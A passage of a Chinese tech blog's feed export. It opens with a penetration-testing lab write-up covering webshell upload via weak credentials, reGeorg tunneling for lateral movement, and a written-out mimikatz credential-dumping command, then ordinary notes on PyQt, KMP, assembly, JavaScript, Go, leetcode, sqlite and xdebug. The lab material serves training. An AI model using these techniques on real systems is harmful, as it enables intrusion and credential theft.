    <content type="html"><![CDATA[<h2 id="任务一-后台文件上传"><a href="#任务一-后台文件上传" class="headerlink" title="任务一 后台文件上传"></a>任务一 后台文件上传</h2><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p><p>1.1 使用目录扫描工具对目标网站的后台地址进行扫描(如wwwscan)</p><p>1.2 使用Burpsuite工具爆破后台管理员密码</p><p>1.3 使用爆破出的管理员密码登录后台，并上传一句话木马</p><p>1.4 使用中国菜刀连接一句话木马</p><p><img src="/posts/c7cfd527/1588072738413.png" alt></p><p>得到后台登陆地址为 <code>manager/login.php</code></p><p>同时发现扫描出了 <code>/myadmin</code> ，猜测是 <code>phpmyadmin</code></p><p><img src="/posts/c7cfd527/1588073088324.png" alt></p><p>弱口令 root ， root试一下，成功登陆</p><p>在数据库中发现了用户名和密码</p><p><img src="/posts/c7cfd527/1588073175463.png" alt></p><p>md5解密：</p><p><img src="/posts/c7cfd527/1588073186989.png" alt></p><p>成功登陆后台，得到 falg1</p><p><img src="/posts/c7cfd527/1588073231030.png" alt></p><h2 id="任务二-sql注入"><a href="#任务二-sql注入" class="headerlink" title="任务二 sql注入"></a>任务二 sql注入</h2><ol><li>利用之前扫描目录得到的结果访问到测试的sql，利用SQL注入漏洞获得网站数据库信息</li><li>构造SQL注入语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>访问存在SQL注入漏洞的页面，表的字段为10</p><p><img src="/posts/c7cfd527/1588073668068.png" alt></p><p><img src="/posts/c7cfd527/1588073693517.png" alt></p><p>尝试联合注入失败</p><p><img src="/posts/c7cfd527/1588074070981.png" alt></p><p>可以直接登陆后台，并修改配置：</p><p><img src="/posts/c7cfd527/1588074131115.png" alt></p><p>然后就可以从后台上传php文件了</p><p><img src="/posts/c7cfd527/1588074182455.png" alt></p><p>成功上传</p><p><img src="/posts/c7cfd527/1588074223735.png" alt></p><p>使用菜刀进行连接</p><p><img src="/posts/c7cfd527/1588074257325.png" alt></p><p>flag</p><p><img src="/posts/c7cfd527/1588074320768.png" alt></p><h2 id="任务三-phpmyadmin-写shell"><a href="#任务三-phpmyadmin-写shell" class="headerlink" title="任务三 phpmyadmin 写shell"></a>任务三 phpmyadmin 写shell</h2><ol><li>用之前扫描目录的结果访问phpmyadmin页面，利用弱口令登录到 <code>phpmyadmin</code> 服务中</li><li>构造SQL语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>弱口令登录 phpmyadmin，访问到flag表得到flag</p><p><img src="/posts/c7cfd527/1588074309330.png" alt></p><h2 id="任务四-扫描PC端并登陆"><a href="#任务四-扫描PC端并登陆" class="headerlink" title="任务四 扫描PC端并登陆"></a>任务四 扫描PC端并登陆</h2><ol><li>利用已经获取到权限的web机器，上传扫描脚本对内网中的其他主机进行扫描</li><li>利用web代理工具代理访问内网的主机，使用之前数据库中获得的账号密码进行登录</li></ol><p>上传 <code>RAScan.py</code>，扫描</p><p><img src="/posts/c7cfd527/1588121789196.png" alt></p><p>扫描结果</p><p><img src="/posts/c7cfd527/1588121802724.png" alt></p><p>可以看到 192.168.2.11 和 192.168.2.10 都开放了3389端口</p><p>上传 <code>tunnel.nosocket.php</code>，访问：</p><p><img src="/posts/c7cfd527/1588121885782.png" alt></p><p>然后使用 <code>reGeorgSocksProxy.py</code> 开启代理</p><p><img src="/posts/c7cfd527/1588121921831.png" alt></p><p>打开 <code>Proxifier</code>，新建连接</p><p><img src="/posts/c7cfd527/1588121958945.png" alt></p><p>然后设置规则：</p><p><img src="/posts/c7cfd527/1588121982402.png" alt></p><p>远程登陆 192.168.2.11</p><p><img src="/posts/c7cfd527/1588122014576.png" alt></p><p>回过头来看数据库，密码是 <code>topsec.123</code></p><p><img src="/posts/c7cfd527/1588121697982.png" alt></p><p>成功连接</p><p><img src="/posts/c7cfd527/1588122024967.png" alt></p><p>flag在C盘根目录</p><p><img src="/posts/c7cfd527/1588122036042.png" alt></p><h2 id="任务五-抓取域控密码并登陆域控"><a href="#任务五-抓取域控密码并登陆域控" class="headerlink" title="任务五 抓取域控密码并登陆域控"></a>任务五 抓取域控密码并登陆域控</h2><ol><li>利用已经登陆到远程桌面的机器，上传mimikatz工具抓取机器内存中的密码</li><li>利用抓取到的密码登陆到另一台机器2.10中</li></ol><p>上传 <code>mimikatz</code> 到 192.168.2.11 的桌面</p><p>以管理员身份运行，输入</p><pre><code>privilege::debugsekurlsa::logonpasswords</code></pre><p>得到密码</p><p><img src="/posts/c7cfd527/1588122108804.png" alt></p><p>远程登陆 192.168.2.10</p><p>flag在C盘根目录</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务一-后台文件上传&quot;&gt;&lt;a href=&quot;#任务一-后台文件上传&quot; class=&quot;headerlink&quot; title=&quot;任务一 后台文件上传&quot;&gt;&lt;/a&gt;任务一 后台文件上传&lt;/h2&gt;&lt;p&gt;本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>端口转发</title>
    <link href="http://prontosil.com/posts/c0e91c93/"/>
    <id>http://prontosil.com/posts/c0e91c93/</id>
    <published>2020-04-25T05:37:12.000Z</published>
    <updated>2020-04-25T09:22:34.739Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pyqt入门</title>
    <link href="http://prontosil.com/posts/341a7d9a/"/>
    <id>http://prontosil.com/posts/341a7d9a/</id>
    <published>2020-04-24T01:54:45.000Z</published>
    <updated>2020-04-27T08:22:59.309Z</updated>
    
    <content type="html"><![CDATA[<p>编写一个简单地GUI应用如下</p><p><img src="/posts/341a7d9a/1587693985383.png" alt></p><p>拖动进度条，下面两个框框会显示不同的数据</p><p>输入姓名，点击设置姓名，下面的框框回回显数据</p><p>点击关闭按钮关闭窗口</p><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><p>妥妥拽拽即可</p><p><img src="/posts/341a7d9a/1587694105991.png" alt></p><p>两个 <code>groupbox</code> 布局可以通过</p><p><img src="/posts/341a7d9a/1587694167654.png" alt></p><p>进行设置</p><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>关闭按钮的信号直接通过拖动即可关联</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><pre><code class="python">import sysfrom PyQt5.QtCore import QObject,pyqtSlot,pyqtSignalclass human(QObject):    nameChanged = pyqtSignal(str)    ageChanged = pyqtSignal([int], [str])    def __init__(self, name=&quot;Mike&quot;, age=10,parent=None):        super().__init__(parent)    def setAge(self, age):        self._age = age        self.ageChanged.emit(self._age)        if age&lt;=18:            ageInfo=&quot;你是 少年&quot;        elif (18&lt; age &lt;=35):            ageInfo=&quot;你是 年轻人&quot;        elif (35&lt; age &lt;=55):            ageInfo=&quot;你是 中年人&quot;        elif (55&lt; age &lt;=80):            ageInfo=&quot;您是 老人&quot;        else:            ageInfo=&quot;您是 寿星啊&quot;        self.ageChanged[str].emit(ageInfo)    def setName(self, name):        self._name = name        self.nameChanged.emit(self._name)</code></pre><p>自定义两个信号 <code>nameChanged</code> 和 <code>ageChanged</code></p><p>自定义槽函数</p><pre><code class="python">class MyWidget(QWidget):    def __init__(self,parent=None):        super().__init__(parent=parent)        self._ui = Ui_Widget()        self._ui.setupUi(self)        self.body = human(&quot;Mike&quot;, 20)        self.body.nameChanged.connect(self.do_nameChanged)        self.body.ageChanged.connect(self.do_ageChanged_int)        self.body.ageChanged[str].connect(self.do_ageChanged_str)    def on_horizontalSlider_valueChanged(self,value):        self.body.setAge(value)        pass    def on_pushButton_clicked(self):        &#39;&#39;&#39;        当按钮点击时候自动触发该槽函数        从输入框中获取到输入的姓名，接着调用body的setName方法，setName方法会放出一个信号，由于之前设置的连接，直接触发do_nameChanged槽函数        &#39;&#39;&#39;            hisName = self._ui.lineEdit_5.text()        self.body.setName(hisName)        pass    # 自定义的槽函数    def do_nameChanged(self,name):        self._ui.editNameHello.setText(&quot;Hello&quot;+name)        pass    def do_ageChanged_int(self,age):        self._ui.editAgeStr.setText(str(age))        pass    @pyqtSlot(str)    def do_ageChanged_str(self,ageInfo):        self._ui.editAgeInt.setText(ageInfo)        pass</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;编写一个简单地GUI应用如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/341a7d9a/1587693985383.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;拖动进度条，下面两个框框会显示不同的数据&lt;/p&gt;
&lt;p&gt;输入姓名，点击设置姓名，下面的框框回回显数据&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://prontosil.com/tags/python/"/>
    
      <category term="Qt" scheme="http://prontosil.com/tags/Qt/"/>
    
  </entry>
  
  <entry>
    <title>python实现KMP算法</title>
    <link href="http://prontosil.com/posts/9bd3a30d/"/>
    <id>http://prontosil.com/posts/9bd3a30d/</id>
    <published>2020-04-22T12:23:39.000Z</published>
    <updated>2020-04-25T09:22:34.736Z</updated>
    
    <content type="html"><![CDATA[<p>学习完KMP算法才发现编程如此的奇妙</p><h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h2><pre><code class="python">def getNext(s):    &#39;&#39;&#39;    计算字符串的next数组    &#39;&#39;&#39;    length = len(s)    next = [0 for i in range(length)]    next[0] = -1    k = -1    j = 0    while j &lt; length-1:        # 这个 or 逻辑写的np        if k == -1 or s[j] == s[k]:            j += 1            k += 1            next[j] = k        else:            k = next[k]    return next</code></pre><p>从这张图可以看到整个的匹配过程，如果 $p_{k}$ 和 $p_{j}$ 匹配不上，那么就去看 $p_{next[k]}$ 和 $p_{j}$</p><p><img src="/posts/9bd3a30d/20150812214857858.png" alt></p><p>比如</p><pre><code>p = &quot;ABCDABD&quot;</code></pre><p>得到的结果就是</p><pre><code>[-1, 0, 0, 0, 0, 1, 2]</code></pre><p>细节感觉还是要靠自己体会</p><h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><pre><code class="python">def KMP(s,p):    next = getNext(p)    m,n = 0,0    while m &lt; len(s) and n &lt; len(p):        if n == -1 or p[n] == s[m]:            n += 1            m += 1        else:            n = next[n]    if n == len(p):        return True    else:        return False</code></pre><p>从头开始匹配即可，遇到匹配不上的情况就返回到 <code>next[k]</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/v_JULY_v/article/details/7041827" target="_blank" rel="noopener">https://blog.csdn.net/v_JULY_v/article/details/7041827</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学习完KMP算法才发现编程如此的奇妙&lt;/p&gt;
&lt;h2 id=&quot;求next数组&quot;&gt;&lt;a href=&quot;#求next数组&quot; class=&quot;headerlink&quot; title=&quot;求next数组&quot;&gt;&lt;/a&gt;求next数组&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;d
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="KMP" scheme="http://prontosil.com/tags/KMP/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土七</title>
    <link href="http://prontosil.com/posts/ce48dac5/"/>
    <id>http://prontosil.com/posts/ce48dac5/</id>
    <published>2020-04-21T11:10:08.000Z</published>
    <updated>2020-04-25T09:22:34.738Z</updated>
    
    <content type="html"><![CDATA[<pre><code>sub al,al ZF=1,PF=1,SFmov al,1  ZF=0,PF=0,SFpush axpop bxadd al,bl add al,10mul al</code></pre><h2 id="实验十"><a href="#实验十" class="headerlink" title="实验十"></a>实验十</h2><h3 id="打印字符"><a href="#打印字符" class="headerlink" title="打印字符"></a>打印字符</h3><blockquote><p>这里的重点是不知道字符串的长度，但是知道字符串十以0结尾的，所以利用 cx = 0 jcxz 会跳转，不断地置ch=0，当取到的字符cl=0时即可跳转</p></blockquote><pre><code class="asm">assume cs:codedata segment    db &#39;Welcome to masm!&#39;, 0data endscode segmentstart:    mov dh,8 ;dh表示行号    mov dl,3 ;dl表示列号    mov cl,2 ;cl表示颜色    mov ax,data    mov ds,ax    mov si,0 ;字符串开始的位置    call show_str    mov ax,4c00h    int 21hshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="asm">assume cs:codedata segment    db 10 dup(0)data endscode segmentstart:    mov ax,12666    mov bx,data    mov ds,bx    mov si,0    call dtoc    mov dh,8    mov dl,3    mov cl,2    call show_str    mov ax,4c00h    int 21hdtoc: mov si,9           s0: mov cx,10       mov dx,00 ;dx存放余数       div cx       add dx,30H              mov [si],dl       mov cx,ax ;判断商是否为0       jcxz rt               dec si       inc cx  ;防止cx=1的时候意外退出循环       loop s0rt: retshow_str:    mov ax,0b800h    mov es,ax ;显存段    mov di,0    mov ax, 160    mul dh    add di,ax     mov al,2    mul dl    add di,ax ;计算开始的位置    mov bl,cl ;保存颜色，因为cx要用来计数s:    mov cl, ds:[si] ;取出字符    mov ch,0 ;当cl=0的时候,cx也等于0，此时执行jcxz    jcxz ok    mov es:[di], cl    mov es:[di+1], bl    add di,2    inc si    loop sok: retcode endsend start</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;sub al,al ZF=1,PF=1,SF
mov al,1  ZF=0,PF=0,SF
push ax
pop bx
add al,bl 
add al,10
mul al&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;实验十&quot;&gt;&lt;a href=&quot;#实验十&quot; 
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>js学习笔记</title>
    <link href="http://prontosil.com/posts/ff9e87b6/"/>
    <id>http://prontosil.com/posts/ff9e87b6/</id>
    <published>2020-04-21T07:46:28.000Z</published>
    <updated>2020-04-25T09:22:34.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h2><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>Object.keys()，Object.getOwnPropertyNames()</p><p>可以用来遍历对象的属性</p><pre><code class="js">var obj1 = {    &quot;name&quot;:&quot;pxy&quot;,    &quot;age&quot;:12}//undefinedObject.getOwnPropertyNames(obj1)//(2) [&quot;name&quot;, &quot;age&quot;]</code></pre><h3 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h3><p>Object.protype上定义的方法就是实例方法，能够被Object的实例调用</p><pre><code class="js">Object.getOwnPropertyNames(Object.prototype)(12) [&quot;constructor&quot;, &quot;__defineGetter__&quot;, &quot;__defineSetter__&quot;, &quot;hasOwnProperty&quot;, &quot;__lookupGetter__&quot;, &quot;__lookupSetter__&quot;, &quot;isPrototypeOf&quot;, &quot;propertyIsEnumerable&quot;, &quot;toString&quot;, &quot;valueOf&quot;, &quot;__proto__&quot;, &quot;toLocaleString&quot;]0: &quot;constructor&quot;1: &quot;__defineGetter__&quot;2: &quot;__defineSetter__&quot;3: &quot;hasOwnProperty&quot;4: &quot;__lookupGetter__&quot;5: &quot;__lookupSetter__&quot;6: &quot;isPrototypeOf&quot;7: &quot;propertyIsEnumerable&quot;8: &quot;toString&quot;9: &quot;valueOf&quot;10: &quot;__proto__&quot;11: &quot;toLocaleString&quot;length: 12__proto__: Array(0)</code></pre><p>这些方法是所有对象都公有的</p><h3 id="valueOf-NaN"><a href="#valueOf-NaN" class="headerlink" title="valueOf"></a>valueOf</h3><p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p><pre><code class="js">var obj = new Object();obj.valueOf() === obj // true</code></pre><p>但是这种情况除外：</p><pre><code>var a = new Object(1)a.valueOf() === a // false</code></pre><p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法</p><pre><code class="js">var obj = new Object();1 + obj //&quot;1[object Object]&quot;</code></pre><p>可以重写 <code>valueOf</code> 方法</p><pre><code class="js">obj.valueOf = function(){    return 2;}1+obj//3</code></pre><p>这个很好理解，因为obj查找 <code>valueOf</code> 函数，会先从自己的属性开始找，找不到就通过 <code>__proto__</code> 找上层对象的<code>valueOf</code> 属性</p><h2 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h2><h3 id="switch-case-结构"><a href="#switch-case-结构" class="headerlink" title="switch case 结构"></a>switch case 结构</h3><p>不推荐如下的方式</p><pre><code class="js">function doAction(action) {  switch (action) {    case &#39;hack&#39;:      return &#39;hack&#39;;    case &#39;slash&#39;:      return &#39;slash&#39;;    case &#39;run&#39;:      return &#39;run&#39;;    default:      throw new Error(&#39;Invalid action.&#39;);  }}</code></pre><p>推荐使用对象的方式</p><pre><code class="js">function doAction(action) {  var actions = {    &#39;hack&#39;: function () {      return &#39;hack&#39;;    },    &#39;slash&#39;: function () {      return &#39;slash&#39;;    },    &#39;run&#39;: function () {      return &#39;run&#39;;    }  };  if (typeof actions[action] !== &#39;function&#39;) {    throw new Error(&#39;Invalid action.&#39;);  }  return actions[action]();}</code></pre><p>更加简洁</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Object对象&quot;&gt;&lt;a href=&quot;#Object对象&quot; class=&quot;headerlink&quot; title=&quot;Object对象&quot;&gt;&lt;/a&gt;Object对象&lt;/h2&gt;&lt;h3 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="js" scheme="http://prontosil.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>go相关笔记</title>
    <link href="http://prontosil.com/posts/e0759275/"/>
    <id>http://prontosil.com/posts/e0759275/</id>
    <published>2020-04-21T01:56:26.000Z</published>
    <updated>2020-04-21T04:23:37.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><pre><code>go env -w GOPROXY=https://goproxy.io,direct# Set environment variable allow bypassing the proxy for selected modulesgo env -w GOPRIVATE=*.corp.example.comgo env -w GO111MODULE=on</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go相关命令&quot;&gt;&lt;a href=&quot;#go相关命令&quot; class=&quot;headerlink&quot; title=&quot;go相关命令&quot;&gt;&lt;/a&gt;go相关命令&lt;/h2&gt;&lt;h3 id=&quot;go-env&quot;&gt;&lt;a href=&quot;#go-env&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="go" scheme="http://prontosil.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-560和为k的子数组</title>
    <link href="http://prontosil.com/posts/eb2e19c0/"/>
    <id>http://prontosil.com/posts/eb2e19c0/</id>
    <published>2020-04-21T01:33:53.000Z</published>
    <updated>2020-04-21T04:23:37.322Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><pre><code>输入:nums = [1,1,1], k = 2输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</code></pre><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><pre><code class="python">def subarraySum(nums, k):    length = len(nums)    count = 0    for i in range(length):        sum = 0        for j in range(i, length):            sum += nums[j]            if sum == k:                count += 1    return count</code></pre><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><pre><code class="python">def subarraySum(self, nums, k):    result, cur_sum = 0, 0    sum_dict = {0:1}    for num in nums:        cur_sum += num        if cur_sum - k in sum_dict:            result += sum_dict[cur_sum - k]        sum_dict[cur_sum] = sum_dict.get(cur_sum, 0) + 1    return result</code></pre><p>go实现的代码</p><pre><code class="go">func subarraySum(nums []int, k int) int {    count := 0    sumMap := map[int]int{0:1,}    sum := 0    for _, num := range nums {        sum += num        if sumMap[sum - k] &gt; 0 {            count += sumMap[sum - k]        }        sumMap[sum]++    }    return count}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。&lt;/p&gt;
&lt;p&gt;示例 1 :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;输入:nums = [1,1,1], k = 2
输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。&lt;/code&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="leetcode" scheme="http://prontosil.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>sqlite数据库笔记</title>
    <link href="http://prontosil.com/posts/532a05c/"/>
    <id>http://prontosil.com/posts/532a05c/</id>
    <published>2020-04-20T13:39:19.000Z</published>
    <updated>2020-04-24T14:18:21.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>.quit</code> 退出</p><p><code>.tables</code> 列出所有的表</p><p><code>.schema</code> 查看构建表的sql语句</p><p><code>.database</code> 查看数据库</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>只需要 <code>sqlite</code> 加上数据库名即可</p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><pre><code>CREATE TABLE user(ID INT NOT NULL PRIMARY KEY,name TEXT ,age TEXT,password TEXT);</code></pre><p><strong>sqlite不支持修改表已经存在的字段</strong>，只能把原有的表重命名一下再创建一个</p><pre><code>alter table user rename to `user_123`;</code></pre><p>如果主键要求自动递增</p><pre><code class="sql">CREATE TABLE user(ID INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,name TEXT,password TEXT);</code></pre><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><pre><code>insert into user(name,password) values(&quot;pxy&quot;, &#39;123456&#39;);</code></pre><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><pre><code class="sql">sqlite&gt; select * from user;1|pxy|123456</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h2&gt;&lt;p&gt;&lt;code&gt;.quit&lt;/code&gt; 退出&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.tables&lt;/code&gt; 列出所有的表&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="sqlit" scheme="http://prontosil.com/tags/sqlit/"/>
    
      <category term="数据库" scheme="http://prontosil.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu配置vscode+xdebug</title>
    <link href="http://prontosil.com/posts/38fc34e6/"/>
    <id>http://prontosil.com/posts/38fc34e6/</id>
    <published>2020-04-20T10:14:29.000Z</published>
    <updated>2020-04-21T04:23:37.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><pre><code>    &quot;editor.mouseWheelZoom&quot;: true,    &quot;php.validate.executablePath&quot;: &quot;/usr/bin/php&quot;</code></pre><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><pre><code>sudo apt install apache2</code></pre><p>然后安装php模块</p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p>之后，修改一下html目录的用户和组</p><pre><code>chown pxy html/ -Rchgrp pxy html/ -R</code></pre><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code>php -i &gt; a.txt</code></pre><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><pre><code>Configuring for:...Zend Module Api No:      20170718Zend Extension Api No:   320170718</code></pre></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><pre><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></pre></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><pre><code>pxy@pxy-VirtualBox:/etc/php/7.2/mods-available$ cat xdebug.ini ;zend_extension=xdebug.soxdebug.remote_enable = 1xdebug.remote_port = 9000;xdebug.idekey = PHPSTORMxdebug.remote_host=localhostxdebug.remote_autostart = 1xdebug.show_error_trace = 1</code></pre><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vscode安装&quot;&gt;&lt;a href=&quot;#vscode安装&quot; class=&quot;headerlink&quot; title=&quot;vscode安装&quot;&gt;&lt;/a&gt;vscode安装&lt;/h2&gt;&lt;p&gt;直接去官网下载deb包，然后双击即可完成安装&lt;/p&gt;
&lt;p&gt;加两个配置选项&lt;/p&gt;
&lt;pre
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Linux" scheme="http://prontosil.com/tags/Linux/"/>
    
      <category term="vscode" scheme="http://prontosil.com/tags/vscode/"/>
    
      <category term="xdebug" scheme="http://prontosil.com/tags/xdebug/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土六</title>
    <link href="http://prontosil.com/posts/79b4f583/"/>
    <id>http://prontosil.com/posts/79b4f583/</id>
